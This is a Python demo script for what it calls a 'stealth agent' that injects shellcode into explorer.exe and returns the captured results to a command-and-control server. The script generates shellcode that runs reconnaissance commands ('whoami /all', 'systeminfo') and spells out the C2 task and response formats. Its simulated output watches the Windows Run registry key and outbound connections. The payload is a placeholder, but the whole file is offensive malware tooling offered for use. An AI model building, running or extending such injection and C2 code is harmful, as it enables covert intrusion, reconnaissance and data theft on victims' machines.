#!/usr/bin/env python3
"""
Shellcode Injection with Result Capture Demo
============================================

This script demonstrates the enhanced shellcode injection capabilities
that can capture execution results and return them to the C2 server.

Features:
- Memory-based output capture
- File system monitoring
- Registry change detection
- Process spawning detection
- Network activity monitoring
- Comprehensive result extraction
"""

import base64
import time
from modules.shellcode import (
    inject_shellcode, 
    generate_result_returning_shellcode,
    extract_shellcode_results
)

def demo_basic_shellcode_injection():
    """Demonstrate basic shellcode injection with result capture"""
    print("🔒 Basic Shellcode Injection with Result Capture")
    print("=" * 50)
    
    # Example shellcode (this is just a placeholder - real shellcode would be actual machine code)
    example_shellcode = base64.b64encode(b"example_shellcode_placeholder").decode()
    
    print(f"Shellcode (base64): {example_shellcode[:20]}...")
    print("Target process: explorer.exe")
    print("Capture output: True")
    print("Wait timeout: 15 seconds")
    
    # Inject shellcode with result capture enabled
    result = inject_shellcode(
        process_name="explorer.exe",
        shellcode_b64=example_shellcode,
        capture_output=True,
        wait_timeout=15
    )
    
    print(f"\n📊 Injection Result:")
    print(f"Status: {result.get('status')}")
    print(f"Message: {result.get('message')}")
    
    if result.get('status') == 'success' and 'execution_results' in result:
        print(f"\n🎯 Execution Results Captured:")
        execution_results = result['execution_results']
        
        # Extract and format the results
        extracted = extract_shellcode_results(execution_results, 'comprehensive')
        
        if extracted['status'] == 'success':
            print(f"✓ Memory changes detected: {extracted['results'].get('memory_changes', {}).get('changed', False)}")
            print(f"✓ File changes detected: {len(extracted['results'].get('file_changes', []))}")
            print(f"✓ Registry changes detected: {len(extracted['results'].get('registry_changes', []))}")
            print(f"✓ Network activity detected: {len(extracted['results'].get('network_activity', []))}")
            print(f"✓ Process changes detected: {len(extracted['results'].get('process_changes', {}))}")
            print(f"✓ Output regions found: {len(extracted['results'].get('output_regions', []))}")
            
            # Show detailed results
            if extracted['results'].get('output_regions'):
                print(f"\n📝 Text Outputs Found:")
                for region in extracted['results']['output_regions']:
                    if region.get('type') == 'text':
                        print(f"  Address: {region['address']}")
                        print(f"  Text: {region['data'][:100]}...")
            
            if extracted['results'].get('file_changes'):
                print(f"\n📁 Files Modified/Created:")
                for file_info in extracted['results']['file_changes'][:3]:  # Show first 3
                    print(f"  {file_info['path']} ({file_info['size']} bytes)")
            
            if extracted['results'].get('network_activity'):
                print(f"\n🌐 Network Activity:")
                for conn in extracted['results']['network_activity'][:3]:  # Show first 3
                    print(f"  {conn['local_address']} -> {conn['remote_address']} ({conn['status']})")
        else:
            print(f"❌ Result extraction failed: {extracted.get('error')}")
    
    return result

def demo_advanced_shellcode_generation():
    """Demonstrate advanced shellcode generation with result return capabilities"""
    print("\n🔧 Advanced Shellcode Generation")
    print("=" * 50)
    
    # Generate shellcode that returns results via memory
    memory_shellcode = generate_result_returning_shellcode(
        command="whoami /all",
        output_type='memory'
    )
    
    print(f"Memory-based shellcode:")
    print(f"  Status: {memory_shellcode.get('status')}")
    print(f"  Type: {memory_shellcode.get('type')}")
    print(f"  Command: {memory_shellcode.get('command')}")
    print(f"  Output type: {memory_shellcode.get('output_type')}")
    
    # Generate shellcode that returns results via file
    file_shellcode = generate_result_returning_shellcode(
        command="systeminfo",
        output_type='file'
    )
    
    print(f"\nFile-based shellcode:")
    print(f"  Status: {file_shellcode.get('status')}")
    print(f"  Type: {file_shellcode.get('type')}")
    print(f"  Command: {file_shellcode.get('command')}")
    print(f"  Output file: {file_shellcode.get('output_file')}")
    
    return memory_shellcode, file_shellcode

def demo_result_extraction_methods():
    """Demonstrate different result extraction methods"""
    print("\n📊 Result Extraction Methods")
    print("=" * 50)
    
    # Simulate execution results
    simulated_results = {
        'memory_changes': {
            'initial': 'initial_memory_state_hex...',
            'final': 'final_memory_state_with_output...',
            'changed': True
        },
        'file_changes': [
            {
                'path': 'C:\\Temp\\output.txt',
                'modified': '2025-08-18T00:30:00',
                'size': 1024
            }
        ],
        'registry_changes': [
            {
                'key': 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
                'accessible': True,
                'note': 'Registry key accessible - changes may have occurred'
            }
        ],
        'network_activity': [
            {
                'local_address': '192.168.1.100:12345',
                'remote_address': '10.0.0.1:80',
                'status': 'ESTABLISHED',
                'type': 'TCP'
            }
        ],
        'output_regions': [
            {
                'address': '0x12345678',
                'data': 'Command output: Administrator',
                'type': 'text'
            }
        ],
        'capture_time': 8.5
    }
    
    print("Simulated execution results loaded")
    
    # Extract results using different methods
    extraction_methods = ['auto', 'memory', 'file', 'registry', 'comprehensive']
    
    for method in extraction_methods:
        print(f"\n🔍 Extraction Method: {method.upper()}")
        extracted = extract_shellcode_results(simulated_results, method)
        
        if extracted['status'] == 'success':
            print(f"  ✓ Successfully extracted {len(extracted['results'])} data categories")
            print(f"  ✓ Output type detected: {extracted['metadata']['output_type_detected']}")
            print(f"  ✓ Total data points: {extracted['metadata']['total_data_points']}")
        else:
            print(f"  ❌ Extraction failed: {extracted.get('error')}")

def demo_c2_integration():
    """Demonstrate how this integrates with C2 server communication"""
    print("\n🌐 C2 Server Integration")
    print("=" * 50)
    
    print("When integrated with the C2 server, the enhanced shellcode injection:")
    print("  1. ✅ Injects shellcode into target process")
    print("  2. ✅ Captures execution results automatically")
    print("  3. ✅ Extracts and formats the results")
    print("  4. ✅ Sends comprehensive results back to C2 server")
    print("  5. ✅ Provides actionable intelligence")
    
    print("\n📋 C2 Task Parameters:")
    print("  {")
    print('    "type": "shellcode_inject",')
    print('    "data": {')
    print('      "process": "explorer.exe",')
    print('      "shellcode": "base64_encoded_shellcode",')
    print('      "capture_output": true,')
    print('      "wait_timeout": 15')
    print('    }')
    print("  }")
    
    print("\n📤 C2 Server Response:")
    print("  {")
    print('    "status": "success",')
    print('    "data": {')
    print('      "message": "Shellcode injected successfully - Execution results captured",')
    print('      "execution_results": {')
    print('        "memory_changes": {...},')
    print('        "file_changes": [...],')
    print('        "network_activity": [...],')
    print('        "output_regions": [...]')
    print('      }')
    print('    }')
    print("  }")

def main():
    """Main demonstration function"""
    print("🚀 Shellcode Injection with Result Capture - Complete Demo")
    print("=" * 70)
    print("This demo shows the enhanced capabilities of the stealth agent")
    print("to capture and return shellcode execution results.\n")
    
    try:
        # Run demonstrations
        demo_basic_shellcode_injection()
        demo_advanced_shellcode_generation()
        demo_result_extraction_methods()
        demo_c2_integration()
        
        print("\n✅ Demo completed successfully!")
        print("\n🎯 Key Benefits:")
        print("  • Automatic result capture without manual intervention")
        print("  • Multiple output detection methods (memory, file, registry)")
        print("  • Comprehensive system monitoring during execution")
        print("  • Structured result extraction and formatting")
        print("  • Seamless C2 server integration")
        print("  • Enhanced intelligence gathering capabilities")
        
    except Exception as e:
        print(f"\n❌ Demo failed: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
